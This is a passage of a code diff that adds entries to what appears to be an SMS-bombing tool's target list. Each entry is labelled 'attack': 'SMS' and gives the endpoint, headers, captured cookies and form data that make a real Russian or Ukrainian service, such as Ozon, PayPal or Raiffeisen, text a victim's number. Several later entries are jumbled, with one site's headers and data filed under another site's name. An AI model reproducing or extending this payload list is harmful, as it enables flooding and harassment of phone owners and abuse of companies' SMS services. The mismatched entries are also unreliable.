+            'url': 'https://www.monobank.com.ua/api/mobapplink/send',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mospizza', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'name': 'Миша', 'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Moyo', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.moyo.ua/identity/registration',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'firstname': 'Миша', 'phone': number, 'email': email()},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mtstv', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'params': {'msisdn': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Multiplex', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://auth.multiplex.ua/login',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'login': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mygames', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://account.my.games/signup_send_sms/',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Niyama', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.niyama.ru/ajax/sendSMS.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'REGISTER[PERSONAL_PHONE]': number, 'code': '', 'sendsms': 'Выслать код'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Nl', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.nl.ua',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'component': 'bxmaker.authuserphone.login', 'sessid': 'bf70db951f54b837748f69b75a61deb4', 'method': 'sendCode', 'phone': number, 'registration': 'N'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Nncard', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://nn-card.ru/api/1.0/register',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number, 'password': 'Bromr$@3246563'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Nova', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.novaposhta.ua/v2.0/json/LoyaltyUserGeneral/registration',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'modelName': 'LoyaltyUserGeneral', 'calledMethod': 'registration', 'system': 'PA 3.0', 'methodProperties': {'City': '8d5a980d-391c-11dd-90d9-001a92567626', 'FirstName': 'Иван', 'LastName': 'Иванов', 'Patronymic': username(), 'Phone': number, 'Email': email(), 'BirthDate': '06.06.2010', 'Password': '0c465655c53d2d8ec971581f5dfdbd83', 'Gender': 'M', 'CounterpartyType': 'PrivatePerson', 'MarketplacePartnerToken': '005056887b8d-b5da-11e6-9f54-cea38574'}},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ok', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'st.r.phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Okean', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://okeansushi.ru/includes/contact.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'params': {'call_mail': '1', 'ajax': '1', 'name': 'Миша', 'phone': number, 'call_time': '1', 'pravila2': 'on'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oldi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.oldi.ru/ajax/reg.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'method': 'isUserPhone', 'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Onlineua', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://secure.online.ua/ajax/check_phone/',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'params': {'reg_phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Osaka', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.osaka161.ru/local/tools/webstroy.webservice.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'name': 'Auth.SendPassword', 'params[0]': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ozon', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number, 'otpId': 0},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Panpizza', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'telephone': '8' + str(number)[1:]},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Pirogin', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://piroginomerodin.ru/index.php?route=sms/login/sendreg',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'telephone': f'+{number}'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Pizza46', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://pizza46.ru/ajaxGet.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'sso.mtsbank.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://sso.mtsbank.ru/api/v2/login',
+            'headers': {
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9',
+                'cookie': 'qrator_jsr=1680818266.827.uR41XSPbgvUJE8Xa-lpmkcfb190101po5rtn8h9foslqsq079-00; qrator_jsid=1680818266.827.uR41XSPbgvUJE8Xa-1redjnbektn4utj2iq5qul410g6rdnge; currentDeliveryMode=pickup; currentRegion=RU-MOW; currentPOS=C027; qrator_ssid=1680818267.798.xsKAKUr2I4yNKPSP-5a8dnsdnl8empsduf802qc29i9sve34l; dtCookie=v_4_srv_35_sn_C70F1F71341E56B38BF9A05A4DF90220_perc_100000_ol_0_mul_1_app-3Ab08f9e5bb12c9b66_1; anonymous-consents=%5B%7B%22templateCode%22%3A%22adpr%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22generic%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22marketing%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%5D; cookie-notification=NOT_ACCEPTED; JSESSIONID=c8db0bd9-3a21-4785-bd9f-f4fc38e54b5f; rxVisitor=1680818386454AHM0FODTPETFQ6JSPJ2JT19ICCJ7T7BO; dtSa=-; age-confirmed=1; isNearestPos=false; dtLatC=1; rxvt=1680820235546|1680818386455; dtPC=35$218386451_656h22vHNHRKMKCHCNADGPTHMKUBQCSAAMPGQTD-0e0',
+                'dnt': '1',
+                'referer': 'https://www.winelab.ru/?utm_referrer=https%3A%2F%2Fwww.google.com%2F',
+                'sec-ch-ua': 'Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'Windows',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0],
+                'x-dtpc': '35$218386451_656h22vHNHRKMKCHCNADGPTHMKUBQCSAAMPGQTD-0e0',
+                'x-requested-with': 'XMLHttpRequest'
+            },
+            'data': {
+                "login": number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'www.winelab.ru',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://www.winelab.ru/confirmation/sendByPhone?number={winelab}',
+            'headers': {
+                'accept': 'application/json',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-length': '2160',
+                'content-type': 'application/json',
+                'cookie': 'site_version=desktop; first_hit_url=%2F; uid=8CBABAB97E432F64661B1A9002B825C9; geo_city_confirmed=yes; advcake_track_id=c933ef3c-a713-5b3a-cae6-44dfcee9143a; advcake_session_id=3a896168-08ed-0339-4511-eb79acf25417; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiZDNjNTc2ODktOGEyOS00Zjc1LWEzZWYtZjc2YWYwMTg2MTFhIiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6ImM3MDg3NGZkLTQ4N2EtNDJmYi1iM2M5LTYwNDhkZTA3ZjVhYyIsImlhdCI6MTY4MDgxOTA3MiwiZXhwIjoxNjgwODE5NjcyLCJqdGkiOiJkM2M1NzY4OS04YTI5LTRmNzUtYTNlZi1mNzZhZjAxODYxMWEifQ.UoWfOrRIlgP-A2dbQbv5PqhgPwcXp9zL3AH95Yuw7bA; sid=ubq6jGQvQ4KQGhtmySYDAg==; city=msk; ets=%2F%2C%2C1680819081; wtfId=1186662-1680819081.666-194.32.122.23-44425',
+                'dnt': '1',
+                'origin': 'https://profi.ru',
+                'referer': 'https://profi.ru/cabinet/login/',
+                'sec-ch-ua': 'Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'Windows',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0],
+                'x-app-id': 'PROFI',
+                'x-new-auth-compatible': '1',
+                'x-requested-with': 'XMLHttpRequest',
+                'x-wtf-id': '1186662-1680819078.359-194.32.122.23-44425'
+            },
+            'data': {
+                '{"query': '#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c',
+                '510e2159ee8fcfb2c5b9\nquery authStrategyStart($type': 'AuthStrategyType!, ',
+                '$initialState': 'AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, ',
+                'initialState': '{',
+                'variables': '{',
+                'type': number,
+                'phoneNumber': number,
+                'defaultOrderCityId': 'prfr',
+                'currentHost': 'https://profi.ru'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'spb.profi.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://spb.profi.ru/graphql',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-type': 'application/x-www-form-urlencoded',
+                'cookie': '__ddg1_=Ugw1h8FzFgIdsoFRF8oF; PHPSESSID=bl2srubtrv1nplb0gd05a2729n; cguuid=1667495511_bl2srubtrv1nplb0gd05a2729n; chg_ref=https%3A%2F%2Fwww.google.com%2F; chg_req=https%3A%2F%2Fwww.chitai-gorod.ru%2F; cityId=213; cityName=%C3%EE%F0%EE%E4%20%CC%EE%F1%EA%E2%E0; countryId=643; countryName=%D0%EE%F1%F1%E8%FF; newsite=1; VisitorId=3ee9d4ec-5370-43ea-8217-af98e2de47cb; showed_action-banner-244=1',
+                'origin': 'https://www.chitai-gorod.ru',
+                'referer': 'https://www.chitai-gorod.ru/',
+                'sec-ch-ua': 'Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'Windows',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': user_agent()[0],
+                'AB-TESTS': '{"personal_feed":"cumulative"}',
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Connection': 'keep-alive',
+                'Content-Length': '41',
+                'Content-Type': 'application/json',
+                'Cookie': 'popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; city_auto_popup_shown=1; ccart=off',
+                'DNT': '1',
+                'Host': 'api.sunlight.net',
+                'Origin': 'https://sunlight.net',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-site',
+                'User-Agent': user_agent()[0],
+                'X-Requested-With': 'SunlightFrontendApp'
+            },
+            'data': {
+                'countryCode': 'RU',
+                'isMobileBrowser': '0',
+                'phoneOperatingSystem': 'android',
+                'phoneNumber': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'api.sunlight.net',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.sunlight.net/v3/customers/authorization/',
+            'headers': {
+
+            },
+            'data': {
+                '{"/appData/action': number,
+                '/initiatePhoneConfirmData/phoneCountry': 'KZ',
+                '/paypalAccountData/phoneOption': 'Mobile',
+                '/paypalAccountData/phoneNumber': number,
+                '/paypalAccountData/createUpdateReady': 'False',
+                '/initiatePhoneConfirmData/sendSms': 'yes',
+                '/initiatePhoneConfirmData/createUpdateReady': 'True',
+                '/initiatePhoneConfirmData/phoneNumber': number,
+                '/initiatePhoneConfirmData/phoneCountryCode': '7"}'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'www.paypal.com',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.paypal.com/KZ/welcome/signup',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '0',
+                'cookie': '_pcl=eW5jY/+J6eIKrg==; old_design=0; is_show_welcome_mechanics=1; _tuid=bfa4749db8e83787741b6d039407f632bf8c7dd1; _space=psk_cl%3A; ab_test=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_analytics=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_main_1_1_98=3; _slfs=1667497919016; _slid=6363ffb10ae16ce93d0f54eb; _slsession=22984220-F353-40B5-9A72-0604DF3D4AC9; _slfreq=6347f312d9062ed0380b52dc%3A6347f38c9a3f3b9e90027775%3A1667505121; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; _slid_server=6363ffb10ae16ce93d0f54eb',
+                'origin': 'https://www.citilink.ru',
+                'referer': 'https://www.citilink.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0],
+                'x-requested-with': 'XMLHttpRequest'
+            },
+            'data': {"/appData/action": "init_phone_confirmation", "/appData/griffinData": "true",
+                   "/initiatePhoneConfirmData/phoneCountry": "KZ",
+                   "/paypalAccountData/phoneOption": "Mobile",
+                   "/paypalAccountData/phoneNumber": str(number)[1:], "/paypalAccountData/phoneCountryCode": "7",
+                   "/paypalAccountData/createUpdateReady": False,
+                   "/initiatePhoneConfirmData/sendSms": "yes",
+                   "/initiatePhoneConfirmData/createUpdateReady": True,
+                   "/initiatePhoneConfirmData/phoneNumber": str(number)[1:],
+                   "/initiatePhoneConfirmData/phoneCountryCode": "7"}
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'www.citilink.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.citilink.ru/registration/confirm/phone/+{phone}/',
+            'headers': {
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
+                'Connection': 'keep-alive',
+                'Content-Length': '24',
+                'Content-Type': 'application/json',
+                'Cookie': 'geo_region_url=www; _ym_uid=16563772911015405951; _ym_d=1656377291; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_site=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; mobile=false; device=pc; _ga=GA1.2.8228657.1662288395; _gid=GA1.2.158704625.1662288395; _gat=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-09-04%2013%3A46%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-09-04%2013%3A46%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20OPR%2F89.0.4447.104; _ym_isad=1; _ym_visorc=w; __zzat129=MDA0dBA=Fz2+aQ==; cfids129=; geo_detect_url=www; geo_detect=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_detect_coords=55.755787%2C37.617634; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form',
+                'DNT': '1',
+                'Host': 'oapi.raiffeisen.ru',
+                'Origin': 'https://www.raiffeisen.ru',
+                'Referer': 'https://www.raiffeisen.ru/retail/cards/debit/cashback-card/',
+                'sec-ch-ua': 'Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'Windows',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-site',
+                'User-Agent': user_agent()[0]
+            },
+            'data': {"number": number}
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'oapi.raiffeisen.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms',
+            'headers': {
+
+            },
+            'data': {
+                'wct_reg_fio': 'Пупкин',
+                'wct_reg_fio2': 'Василий',
+                'wct_reg_phone': 'madyart',
+                'wct_reg_ch': 'Y',
+                'wct_reg_1': '',
+                'wct_reg_2': '',
+                'wct_reg_3': '1',
+                'USER_PHONE': '7',
+                'USER_PHONE2': '',
+                'LOGIN1': '071',
+                'LOGIN2': '072',
+                'wc_phone_psw': 'sdfgwse5rgfdzvbsedf',
+                'wc_phone_psw2': 'sdfgwse5rgfdzvbsedf'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'madyart.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://madyart.ru/local/aut.php',
+            'headers': {
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Connection': 'keep-alive',
+                'Content-Length': '673',
+                'Content-Type': 'application/json;charset=UTF-8',
+                'Host': 'admin.growfood.pro',
+                'Origin': 'https://growfood.pro',
+                'Referer': 'https://growfood.pro/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-site',
+                'User-Agent': user_agent()[0]
+            },
+            'data': {
+                'analyticalData': '{',
+                'cookie': '{',
+                'new_site': 'new',
+                '_ga': 'GA1.2.330582126.1680820262',
+                '_ym_uid': '16808202623003063882',
+                'default_city': 'msk',
+                'landingUpdateDefaultCity': 'msk',
+                '_efst': 'ba657a5e9ce612ea91edd7442b7234b6509f0f4ce19abe517f66a024931a8966',
+                'city_confirmed': 'true',
+                'utm': '{}',
+                'referrer': 'None',
+                'host': 'growfood.pro',
+                'client': '{',
+                'phone': 'growfood',
+                'cityId': '2'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'admin.growfood.pro',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://admin.growfood.pro/api/personal-cabinet/v2_0/authentication/send-sms',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9',
+                'baggage': 'sentry-environment=prod-ru,sentry-public_key=dd1d902e97bb41b2a74f1b3085ae7b90,sentry-trace_id=355c468a4ec348ab85785e9e92a58cfb,sentry-sample_rate=0.3',
+                'content-type': 'application/json; charset=UTF-8',
+                'cookie': 'route=1680820917.106.1118.829394|4d33fc6b928f7f8ef63e5c30cfa97296; WELCOMESESSID=igv6e0v73vouvqliq8rp4o8qhv; _user_location=3eaf80b99b78f648b2ef3159af22d67d1551ea0424141f70965891ede650e8e3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_user_location%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D; utm=4bbcd7bfd0c9102467242ca243ed5d844d77cb0e29dba11fbac5c81df541132ea%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22utm%22%3Bi%3A1%3Bs%3A96%3A%22%7B%22utm_source%22%3A%22Direct%22%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%2C%22utm_content%22%3Anull%7D%22%3B%7D; JivoSiteLoaded=1; cf_chl_2=6ed16fa4ee7406c; cf_clearance=On.4KfrVBSBFmzK4HeBq8wWBoWXReX54BO4lGvGspG8-1680820926-0-150',
+                'dnt': '1',
+                'referer': 'https://abc.ru/registration/',
+                'sec-ch-ua': 'Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'Windows',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sentry-trace': '355c468a4ec348ab85785e9e92a58cfb-98221c61647946d4-1',
+                'user-agent': user_agent()[0],
+                'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw',
+                'content-length': '164',
+                'origin': 'https://abc.ru',
+                'bx-ajax': 'true',
+                'x-bitrix-csrf-token': 'ce46266c9ca3de6414e13d163615c827',
+                'x-bitrix-site-id': 's1'
+            },
+            'data': {
+                '{"phone': number,
+                '_csrf': 'oqqL7n8CPs-K8TyRRe11rFxa0lUmFcqXKMx-KWjt6-mQ_f2DLWVR9r2EW_t3rCHraQ2BYWd2g8RwvQ1cKaaviw=="}'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'abc.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://abc.ru/clientapi/v1/user/phone-sms/',
+            'headers': {
+                'accept': 'application/json',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '505',
+                'content-type': 'application/json',
+                'cookie': '.AspNetCore.Culture=c%3Dru%7Cuic%3Dru',
+                'origin': 'https://auth.mosmetro.ru',
+                'referer': 'https://auth.mosmetro.ru/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Df1dac608-dd35-4717-8cbb-18e2f7a1d522%26redirect_uri%3Dhttps%253A%252F%252Flk.mosmetro.ru%252Fexternal-auth%26response_type%3Dcode%26scope%3Dopenid%2520offline_access%2520nbs.ppa%26code_challenge%3Df3L8XTKxMOIGSvyONKNJ6baxDFWCTaB5uFw_7RU6LP8%26code_challenge_method%3DS256%26nonce%3D638031215106710169.NTFlZmI3NTAtYjZhZS00ZTBlLWIzOWItNzg3ZmQxNzQ1NmVhYzcwMGM1ZTQtNTViMi00ZDE3LTk3NTgtNTEzMThkYTg5YzRi%26state%3Dfc7kxm178qekphufyqkq0k%26ui_locales%3Dru%26acr_values%3Dtheme%253Alight&providers=%5B%0A%20%20%22yandex%22,%0A%20%20%22apple%22,%0A%20%20%22sudir%22,%0A%20%20%22google%22,%0A%20%20%22vkontakte%22,%0A%20%20%22local%22%0A%5D',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0]
+            },
+            'data': {
+                '{"login': number,
+                'returnUrl': '/connect/authorize/callback?client_id=f1dac608-dd35-4717-8cbb-18e2f7a1d522&redirect_uri=https%3A%2F%2Flk.mosmetro.ru%2Fexternal-auth&response_type=code&scope=openid%20offline_access%20nbs.ppa&code_challenge=f3L8XTKxMOIGSvyONKNJ6baxDFWCTaB5uFw_7RU6LP8&code_challenge_method=S256&nonce=638031215106710169.NTFlZmI3NTAtYjZhZS00ZTBlLWIzOWItNzg3ZmQxNzQ1NmVhYzcwMGM1ZTQtNTViMi00ZDE3LTk3NTgtNTEzMThkYTg5YzRi&state=fc7kxm178qekphufyqkq0k&ui_locales=ru&acr_values=theme%3Alight"}'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'auth.mosmetro.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://auth.mosmetro.ru/api/auth/login/sms',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '117',
+                'content-type': 'application/json',
+                'cookie': 'utid=uRELsmNka8x+akk1EoeDAg==',
+                'origin': 'https://spb.uteka.ru',
+                'platform': 'Desktop',
+                'referer': 'https://spb.uteka.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
